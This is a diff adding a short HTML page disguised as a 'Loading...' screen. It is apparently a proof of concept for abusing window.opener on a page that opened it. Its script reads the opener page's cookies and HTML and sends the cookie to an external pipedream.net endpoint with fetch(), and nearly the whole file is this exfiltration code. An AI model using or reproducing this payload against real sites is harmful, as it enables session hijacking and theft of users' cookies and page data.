@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+<script>
+// This page was opened BY the vulnerable page
+// So window.opener refers to the vulnerable page
+
+if (window.opener && window.opener.document) {
+    // Same-origin: Can access everything
+    let cookie = window.opener.document.cookie;
+    let html = window.opener.document.body.innerHTML;
+    
+    // Send data to your server
+    fetch('https://eo8mlj9bls9wxmp.m.pipedream.net?cookie=' + encodeURIComponent(cookie));
+}
+</script>
+</body>
+</html>
